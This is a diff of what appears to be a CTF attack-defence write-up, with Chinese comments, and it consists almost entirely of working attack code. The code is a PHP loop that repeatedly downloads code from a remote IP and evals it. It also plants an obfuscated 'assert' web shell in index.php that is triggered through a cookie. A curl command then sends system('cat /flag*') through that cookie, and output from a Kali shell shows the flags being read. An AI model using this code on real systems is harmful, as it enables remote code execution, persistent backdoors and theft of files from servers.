@@ -78,7 +78,7 @@ set_time_limit(0);
 $remote_file = 'http://182.168.2.2/file.txt';
 while($code = file_get_contents($remote_file)){
   @eval($code);
-  sleep(10);
+  sleep(10);  //几秒写一次
 };
 ?>
 ```
@@ -86,11 +86,19 @@ while($code = file_get_contents($remote_file)){
 **`http://182.168.2.2/file.txt`**
 
 ```
-file_put_contents('index.php','<?php $a="a"."s"."se"."rt";$a($_GET[1]);?>',FILE_APPEND);
+file_put_contents('index.php','<?php $a="a"."s"."se"."rt";$a($_COOKIE[1]);?>',FILE_APPEND);
 //FILE_APPEND追加写入, 单引号括起来，$无需转义
 ```
 
-**`curl "http://172.16.2.234:8011" --cookie "1=system('echo 6666666 & cat /flag*')"`**
+**`curl "http://172.16.2.234:8011/index.php" --cookie "1=system('echo 66668888 & cat /flag*')"`**
+
+```
+root@kali:/tmp# curl "http://172.16.2.234:8011" -s --cookie "1=system('echo 66668888 & cat /flag*')"|grep 66668888
+a17ef5f51631bba2b7098bdeee4d729566668888
+a17ef5f51631bba2b7098bdeee4d729566668888
+a17ef5f51631bba2b7098bdeee4d729566668888
+...
+```
 
 
 
